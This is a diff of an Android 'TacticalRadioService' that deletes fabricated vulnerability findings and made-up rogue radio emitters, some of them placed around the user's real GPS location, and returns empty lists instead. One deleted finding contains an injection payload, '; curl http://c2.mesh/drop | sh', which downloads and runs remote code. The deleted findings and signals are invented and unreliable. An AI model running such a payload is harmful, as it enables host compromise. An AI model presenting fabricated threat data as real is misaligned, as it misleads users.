@@ -252,103 +252,9 @@ class TacticalRadioService : Service() {
         )
     )
 
-    val defaultFindings: List<VulnerabilityFinding> = listOf(
-        VulnerabilityFinding(
-            id = "CWE-120-MEMCPY",
-            title = "Unbounded Buffer Copy in Frame Deserializer",
-            cweId = "CWE-120: Buffer Copy without Checking Size of Input",
-            cvssScore = 9.8f,
-            severity = VulnerabilitySeverity.CRITICAL,
-            affectedComponent = "parse_microwave_packet() / memcpy handler",
-            description = "The deserialization routine blindly copies inbound bytes into a fixed 64-byte struct without validating the stream length against the allocated struct boundaries.",
-            exploitScenario = "An attacker transmitting a malformed microwave frame over 64 bytes can overwrite the stack frame return address and hijack control flow.",
-            remediation = "Enforce strict length validation: verify (stream_len == sizeof(MicrowaveFrame)) and sanitize payload_len before buffer handling.",
-            vulnerableCodeSnippet = "memcpy(&frame, raw_stream, stream_len);",
-            patchedCodeSnippet = "if (stream_len != sizeof(MicrowaveFrame)) return;\nif (frame.payload_len > sizeof(frame.command_buffer) - 1) return;\nmemcpy(&frame, raw_stream, sizeof(MicrowaveFrame));",
-            discoveredBy = AgentRole.SAST_SENTINEL,
-            latitude = 37.7891,
-            longitude = -122.4014,
-            locationName = "Financial District Telemetry Center",
-            locationAddress = "500 Howard St, San Francisco, CA",
-            elevationMeters = 68
-        ),
-        VulnerabilityFinding(
-            id = "CWE-78-OS-INJECT",
-            title = "Remote OS Command Execution via Demodulated Frame",
-            cweId = "CWE-78: Improper Neutralization of Special Elements used in an OS Command",
-            cvssScore = 9.4f,
-            severity = VulnerabilitySeverity.CRITICAL,
-            affectedComponent = "system(frame.command_buffer)",
-            description = "Directly passing untrusted unauthenticated RF command payloads to the host system() shell executes arbitrary shell commands under host privileges.",
-            exploitScenario = "Crafting a payload with '; curl http://c2.mesh/drop | sh' results in immediate root compromise upon signal reception.",
-            remediation = "Eliminate system() shell execution. Replace with an explicit whitelist enum command dispatcher with strict HMAC-SHA256 signature verification.",
-            vulnerableCodeSnippet = "system(frame.command_buffer);",
-            patchedCodeSnippet = "enum CommandId { CMD_PING = 1, CMD_TELEMETRY = 2 };\nswitch(frame.command_id) {\n    case CMD_PING: handle_tactical_ping(); break;\n    default: log_unauthorized_command(frame.command_id);\n}",
-            discoveredBy = AgentRole.SAST_SENTINEL,
-            latitude = 37.7749,
-            longitude = -122.4194,
-            locationName = "Civic Gateway Command Server",
-            locationAddress = "100 Larkin St, San Francisco, CA",
-            elevationMeters = 40
-        ),
-        VulnerabilityFinding(
-            id = "CWE-798-HARDCODED-KEY",
-            title = "Hardcoded Static Cryptographic Secret",
-            cweId = "CWE-798: Use of Hard-coded Credentials",
-            cvssScore = 7.5f,
-            severity = VulnerabilitySeverity.HIGH,
-            affectedComponent = "HARDCODED_XOR_KEY / mesh_network_key",
-            description = "Hardcoded static encryption keys embedded directly in firmware source are trivial to extract via Ghidra/radare2 disassembly.",
-            exploitScenario = "Any eavesdropper in RF range can decode all intercepted microwave/mesh traffic in real time and spoof authenticated frames.",
-            remediation = "Derive ephemeral session keys using ECDH (Curve25519) and store root secrets inside Android Keystore / Hardware Secure Element (TEE/SE).",
-            vulnerableCodeSnippet = "const char* HARDCODED_XOR_KEY = \"TACTICAL_LINK_KEY_2026\";",
-            patchedCodeSnippet = "KeyStore.getInstance(\"AndroidKeyStore\").getKey(\"tactical_aes_gcm_key\", null)",
-            discoveredBy = AgentRole.CIPHER_INSPECTOR,
-            latitude = 37.7946,
-            longitude = -122.3999,
-            locationName = "Embarcadero Ground Station",
-            locationAddress = "1 Ferry Building, San Francisco, CA",
-            elevationMeters = 15
-        ),
-        VulnerabilityFinding(
-            id = "CWE-294-REPLAY",
-            title = "Absence of Replay Protection & Sequence Nonces",
-            cweId = "CWE-294: Authentication Bypass by Capture-replay",
-            cvssScore = 7.1f,
-            severity = VulnerabilitySeverity.HIGH,
-            affectedComponent = "decrypt_mesh_payload()",
-            description = "No monotonic counter, timestamp window, or cryptographic initialization vector (IV) is enforced on incoming radio packets.",
-            exploitScenario = "An attacker can capture valid telemetry or command bursts with an SDR and re-transmit them at will to trigger repeated state changes.",
-            remediation = "Implement AES-256-GCM with a 96-bit unique IV and an escalating 64-bit sequence counter with a sliding replay verification window.",
-            vulnerableCodeSnippet = "for (int k=0; k<len; k++) plaintext[k] = ciphertext[k] ^ S[k % 256];",
-            patchedCodeSnippet = "bool verify_and_decrypt_gcm(const uint8_t* iv, uint64_t seq, const uint8_t* tag, uint8_t* out);",
-            discoveredBy = AgentRole.CIPHER_INSPECTOR,
-            latitude = 37.7580,
-            longitude = -122.4150,
-            locationName = "Potrero Substation Relay",
-            locationAddress = "16th & Potrero Ave, San Francisco, CA",
-            elevationMeters = 45
-        ),
-        VulnerabilityFinding(
-            id = "CWE-319-RF-CLEARTEXT",
-            title = "Cleartext RF Waveform Telemetry Emission",
-            cweId = "CWE-319: Cleartext Transmission of Sensitive Information over RF",
-            cvssScore = 6.8f,
-            severity = VulnerabilitySeverity.MEDIUM,
-            affectedComponent = "Microwave RF 5.84 GHz Transmitter Carrier",
-            description = "Inbound and outbound telemetry beacons transmit GPS coordinates, station IDs, and tactical logs without authenticated link-layer encryption.",
-            exploitScenario = "A basic Software Defined Radio (RTL-SDR / HackRF) equipped with a directional antenna can passively demodulate and eavesdrop on all signals up to 5km away.",
-            remediation = "Employ link-layer authenticated encryption (ChaCha20-Poly1305 or AES-GCM) combined with Direct Sequence Spread Spectrum (DSSS) or Frequency Hopping (FHSS).",
-            vulnerableCodeSnippet = "printf(\"[RX LINK] Executing telemetry command: %s\\n\", frame.command_buffer);",
-            patchedCodeSnippet = "crypto_aead_chacha20poly1305_ietf_decrypt(decrypted_buf, &len, NULL, ciphertext, clen, ad, adlen, nonce, key);",
-            discoveredBy = AgentRole.SPECTRUM_ANALYST,
-            latitude = 37.8080,
-            longitude = -122.4177,
-            locationName = "North Waterfront Microwave Mast",
-            locationAddress = "Pier 39 Radio Mast, San Francisco, CA",
-            elevationMeters = 82
-        )
-    )
+    // No synthetic vulnerability findings are placed on the tactical map.
+    // Findings must be generated from supplied evidence or explicit user input.
+    val defaultFindings: List<VulnerabilityFinding> = emptyList()
 
     /**
      * Resolves vulnerability findings for the active environment.
@@ -358,52 +264,9 @@ class TacticalRadioService : Service() {
         environmentMode: TacticalEnvironmentMode,
         deviceLocation: DeviceLocationInfo?
     ): List<VulnerabilityFinding> {
-        if (environmentMode == TacticalEnvironmentMode.REAL_DEVICE && deviceLocation != null && deviceLocation.isRealHardwareFix) {
-            val baseLat = deviceLocation.latitude
-            val baseLon = deviceLocation.longitude
-            val elev = deviceLocation.altitudeMeters.toInt()
-            val hostName = deviceLocation.locationName.take(30)
-            val hostAddr = deviceLocation.locationAddress.ifBlank { deviceLocation.locationName }
-
-            return listOf(
-                defaultFindings[0].copy(
-                    latitude = baseLat,
-                    longitude = baseLon,
-                    locationName = "Audited Host Device: $hostName",
-                    locationAddress = hostAddr,
-                    elevationMeters = elev
-                ),
-                defaultFindings[1].copy(
-                    latitude = baseLat + 0.0006,
-                    longitude = baseLon - 0.0008,
-                    locationName = "Local System Command Node",
-                    locationAddress = "$hostAddr (North-West Sector)",
-                    elevationMeters = elev
-                ),
-                defaultFindings[2].copy(
-                    latitude = baseLat - 0.0008,
-                    longitude = baseLon + 0.0007,
-                    locationName = "Local Vicinity Firmware Gateway",
-                    locationAddress = "$hostAddr (South-East Sector)",
-                    elevationMeters = elev
-                ),
-                defaultFindings[3].copy(
-                    latitude = baseLat - 0.0015,
-                    longitude = baseLon - 0.0009,
-                    locationName = "Local RF Mesh Link Interface",
-                    locationAddress = "$hostAddr (South-West Sector)",
-                    elevationMeters = elev
-                ),
-                defaultFindings[4].copy(
-                    latitude = baseLat + 0.0014,
-                    longitude = baseLon + 0.0012,
-                    locationName = "Local Microwave Telemetry Transmitter",
-                    locationAddress = "$hostAddr (North-East Sector)",
-                    elevationMeters = elev
-                )
-            )
-        }
-        return defaultFindings
+        // A GPS fix does not constitute a vulnerability finding.
+        // Never manufacture findings or offset them around the device location.
+        return emptyList()
     }
 
     /**
@@ -416,153 +279,14 @@ class TacticalRadioService : Service() {
         deviceLocation: DeviceLocationInfo?,
         realWifiSignal: RfSignalInfo?
     ): List<RfSignalInfo> {
-        if (environmentMode == TacticalEnvironmentMode.REAL_DEVICE && deviceLocation != null && deviceLocation.isRealHardwareFix) {
-            val list = mutableListOf<RfSignalInfo>()
-
-            // 1. Real Device Wi-Fi Connection Emitter
-            if (realWifiSignal != null) {
-                list.add(realWifiSignal)
-            } else {
-                list.add(
-                    RfSignalInfo(
-                        id = "real_device_base",
-                        frequencyMhz = 2437.0,
-                        bandName = "2.4 GHz Host AP",
-                        modulationType = "802.11 b/g/n Base Link",
-                        powerDbm = -54.0f,
-                        snrDb = 26.0f,
-                        bandwidthKhz = 20000f,
-                        isRogue = false,
-                        azimuthDegrees = 0.0f,
-                        estimatedDistanceM = 2.0f,
-                        latitudeOffset = 0f,
-                        longitudeOffset = 0f,
-                        protocolName = "Host Device RF Transceiver",
-                        demodulatedText = "[AUTHORIZED] HOST: ${deviceLocation.locationName.take(30)} | LAT: ${String.format("%.4f", deviceLocation.latitude)} LON: ${String.format("%.4f", deviceLocation.longitude)}",
-                        rawHexPayload = "AA 01 02 03 HOST_LINK_ACTIVE",
-                        audioToneFrequencyHz = 680,
-                        latitude = deviceLocation.latitude,
-                        longitude = deviceLocation.longitude,
-                        locationName = "Device Anchor: ${deviceLocation.locationName}",
-                        locationAddress = deviceLocation.locationAddress.ifBlank { "Host Device Real Location" },
-                        elevationMeters = deviceLocation.altitudeMeters.toInt(),
-                        description = "Host Android physical device active radio transceiver beacon and local WLAN anchor point.",
-                        analystAssessment = "AUTHORIZED LOCAL BASE: Direct hardware anchor from this smartphone. Compliant frame timing, 0% packet error rate, verified gateway IP connectivity.",
-                        threatRating = "AUTHORIZED BASE",
-                        encryptionState = "HARDWARE AUTHENTICATED",
-                        transmissionMode = "Active 802.11 Link",
-                        spectralPurityPercent = 99.2f,
-                        recommendedAction = "Maintain whitelisted device anchor."
-                    )
-                )
-            }
-
-            val hostAddr = deviceLocation.locationAddress.ifBlank { deviceLocation.locationName }
-
-            // 2. Localized Tactical Scanners & Rogue Emitters offset around user's real location
-            list.add(
-                RfSignalInfo(
-                    id = "local_rogue_microwave",
-                    frequencyMhz = 5842.50,
-                    bandName = "5.8 GHz Microwave Link",
-                    modulationType = "Direct Carrier Modulation",
-                    powerDbm = -44.2f,
-                    snrDb = 27.5f,
-                    bandwidthKhz = 20000f,
-                    isRogue = true,
-                    azimuthDegrees = 42.0f,
-                    estimatedDistanceM = 160f,
-                    latitudeOffset = 0.0011f,
-                    longitudeOffset = 0.0014f,
-                    protocolName = "Unauthenticated RF Telemetry Carrier",
-                    demodulatedText = "[ALERT] ROGUE_CARRIER | RECV_POWER: PEAK | ADJACENT_TO_DEVICE",
-                    rawHexPayload = "DE AD 58 42 00 01 02 03",
-                    audioToneFrequencyHz = 1420,
-                    latitude = deviceLocation.latitude + 0.0011,
-                    longitude = deviceLocation.longitude + 0.0014,
-                    locationName = "Local Vicinity Microwave Transmitter",
-                    locationAddress = "$hostAddr (NE Sector +160m)",
-                    elevationMeters = (deviceLocation.altitudeMeters + 12).toInt(),
-                    description = "High-powered 5.8 GHz directional microwave link broadcasting unauthenticated command bursts in the vicinity of host device.",
-                    analystAssessment = "CRITICAL PROXIMITY ROGUE: Continuous carrier burst within 160m bearing 42° NE. Lacks cryptographic payload authentication. Emitter is transmitting uncoordinated bursts that may compromise local perimeter sensors.",
-                    threatRating = "CRITICAL ROGUE",
-                    encryptionState = "UNENCRYPTED / RAW STREAM",
-                    transmissionMode = "High-Duty Cycle Burst",
-                    spectralPurityPercent = 79.1f,
-                    recommendedAction = "Deploy physical direction-finding triangulation to locate rogue transmitter mast; initiate 5.8 GHz band filtering."
-                )
-            )
-
-            list.add(
-                RfSignalInfo(
-                    id = "local_rogue_subghz",
-                    frequencyMhz = 915.20,
-                    bandName = "915 MHz ISM Mesh",
-                    modulationType = "FSK Waveform",
-                    powerDbm = -61.0f,
-                    snrDb = 18.0f,
-                    bandwidthKhz = 500f,
-                    isRogue = true,
-                    azimuthDegrees = 165.0f,
-                    estimatedDistanceM = 290f,
-                    latitudeOffset = -0.0020f,
-                    longitudeOffset = 0.0008f,
-                    protocolName = "Unencrypted LoRa/FSK Mesh",
-                    demodulatedText = "[MESH_SNIFF] CLEAR_PAYLOAD | HOP_COUNT: 2 | LOC: LOCAL_SECTOR",
-                    rawHexPayload = "4D 45 53 48 02 46 53 4B",
-                    audioToneFrequencyHz = 880,
-                    latitude = deviceLocation.latitude - 0.0020,
-                    longitude = deviceLocation.longitude + 0.0008,
-                    locationName = "Local Vicinity Tactical Mesh Node",
-                    locationAddress = "$hostAddr (SE Sector +290m)",
-                    elevationMeters = deviceLocation.altitudeMeters.toInt(),
-                    description = "915 MHz sub-GHz tactical mesh packet transceiver relaying unencrypted routing frames across adjacent nodes.",
-                    analystAssessment = "HIGH THREAT MESH TRAFFIC: Cleartext payload containing multi-hop routing headers ('HOP_COUNT: 2'). Emitter is subject to frame tampering and unauthorized node injection.",
-                    threatRating = "HIGH THREAT",
-                    encryptionState = "CLEARTEXT (NO ENCRYPTION)",
-                    transmissionMode = "Periodic LoRa / FSK Mesh",
-                    spectralPurityPercent = 88.6f,
-                    recommendedAction = "Quarantine mesh node routing address; mandate AES-CCM packet encryption keys."
-                )
-            )
-
-            list.add(
-                RfSignalInfo(
-                    id = "local_subghz_burst",
-                    frequencyMhz = 433.92,
-                    bandName = "433 MHz Sub-GHz",
-                    modulationType = "Chirp Spread",
-                    powerDbm = -41.0f,
-                    snrDb = 29.0f,
-                    bandwidthKhz = 250f,
-                    isRogue = true,
-                    azimuthDegrees = 225.0f,
-                    estimatedDistanceM = 95f,
-                    latitudeOffset = -0.0007f,
-                    longitudeOffset = -0.0009f,
-                    protocolName = "Industrial RF Remote Emitter",
-                    demodulatedText = "[ROGUE_BURST] INTERVAL: 100ms | RSSI: HIGH | LOCAL_PROXIMITY",
-                    rawHexPayload = "AA AA AA AA 43 39 20",
-                    audioToneFrequencyHz = 1750,
-                    latitude = deviceLocation.latitude - 0.0007,
-                    longitude = deviceLocation.longitude - 0.0009,
-                    locationName = "Local Industrial RF Sensor",
-                    locationAddress = "$hostAddr (SW Sector +95m)",
-                    elevationMeters = deviceLocation.altitudeMeters.toInt(),
-                    description = "Industrial 433.92 MHz remote telemetry beacon transmitting repetitive sensor pulses at 100ms intervals.",
-                    analystAssessment = "ELEVATED THREAT BEACON: Fixed synchronization sequence without rolling-code protection. Replay susceptibility confirmed under RF spectrum analysis.",
-                    threatRating = "ELEVATED THREAT",
-                    encryptionState = "STATIC KEY SEQUENCE",
-                    transmissionMode = "100ms Periodic Chirp",
-                    spectralPurityPercent = 92.0f,
-                    recommendedAction = "Isolate industrial transceiver receiver; flash cryptographic rolling-code update."
-                )
-            )
-
-            return list
+        // Only return an observation supplied by a real Android data source.
+        // Do not create microwave, sub-GHz, azimuth, distance, payload, or threat
+        // values that the phone did not actually measure.
+        return if (environmentMode == TacticalEnvironmentMode.REAL_DEVICE && realWifiSignal != null) {
+            listOf(realWifiSignal)
+        } else {
+            emptyList()
         }
-
-        return defaultSignals
     }
 
     /**
